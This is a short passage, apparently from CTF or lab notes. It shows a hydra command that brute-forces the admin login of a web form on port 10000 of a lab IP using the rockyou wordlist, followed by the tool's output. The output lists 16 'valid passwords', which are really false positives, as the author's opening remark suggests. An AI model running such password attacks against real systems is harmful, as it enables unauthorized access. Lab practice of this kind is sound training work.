that's not true, sadly ><
****

****

`sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.42.179 -s 10000 https-post-form "/:user=^USER^&pass=^PASS^:F=Login failed. Please try again." -o output_hydra2`

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.42.179:10000/:user=^USER^&pass=^PASS^:F=Login failed. Please try again.
[10000][http-post-form] host: 10.10.42.179   login: admin   password: password
[10000][http-post-form] host: 10.10.42.179   login: admin   password: monkey
[10000][http-post-form] host: 10.10.42.179   login: admin   password: lovely
[10000][http-post-form] host: 10.10.42.179   login: admin   password: nicole
[10000][http-post-form] host: 10.10.42.179   login: admin   password: 123456
[10000][http-post-form] host: 10.10.42.179   login: admin   password: iloveyou
[10000][http-post-form] host: 10.10.42.179   login: admin   password: princess
[10000][http-post-form] host: 10.10.42.179   login: admin   password: 1234567
[10000][http-post-form] host: 10.10.42.179   login: admin   password: 12345678
[10000][http-post-form] host: 10.10.42.179   login: admin   password: babygirl
[10000][http-post-form] host: 10.10.42.179   login: admin   password: abc123
[10000][http-post-form] host: 10.10.42.179   login: admin   password: daniel
[10000][http-post-form] host: 10.10.42.179   login: admin   password: jessica
[10000][http-post-form] host: 10.10.42.179   login: admin   password: rockyou
[10000][http-post-form] host: 10.10.42.179   login: admin   password: 12345
[10000][http-post-form] host: 10.10.42.179   login: admin   password: 123456789
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 20:29:35
```